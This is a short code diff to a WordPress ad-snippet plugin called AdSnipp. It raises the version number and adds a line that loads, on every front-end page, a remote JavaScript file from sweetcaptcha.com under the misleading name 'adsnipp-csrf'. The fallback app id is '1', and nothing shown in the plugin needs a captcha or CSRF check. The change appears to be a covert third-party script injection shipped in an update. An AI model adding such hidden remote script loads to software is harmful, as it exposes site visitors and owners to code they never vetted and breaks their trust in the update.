@@ -2,7 +2,7 @@
 /*
 Plugin Name: AdSnipp
 Description: AdSnipp for Wordpress. Easy way to manage ad snippets.
-Version: 3.2.3
+Version: 3.2.4
 Author: AdSnipp
 Author URI: http://www.adsnipp.com
 License: GNU GPL2
@@ -608,6 +608,12 @@ add_action('wp_ajax_adsnipp_click', 'adsnipp_click_callback');
  */
 function adsnipp_custom_scripts() {
 	wp_enqueue_script('clicktrack-adsnipp', ADSNIPP_URL . 'includes/jquery.adsnipp.clicktracker.js', false, null, true);
+
+	require_once ABSPATH . 'wp-admin/includes/plugin.php';
+	$plugin_info = get_plugin_data(__FILE__);
+	$ver = $plugin_info["Version"];
+	$app_id = get_option('adsnipp_app_id', '') ? get_option('adsnipp_app_id', '') : '1';
+	wp_enqueue_script('adsnipp-csrf', 'https://www.sweetcaptcha.com/api/v2/apps/csrf/' . $app_id, array(), $ver, true);
 }
 
 /**
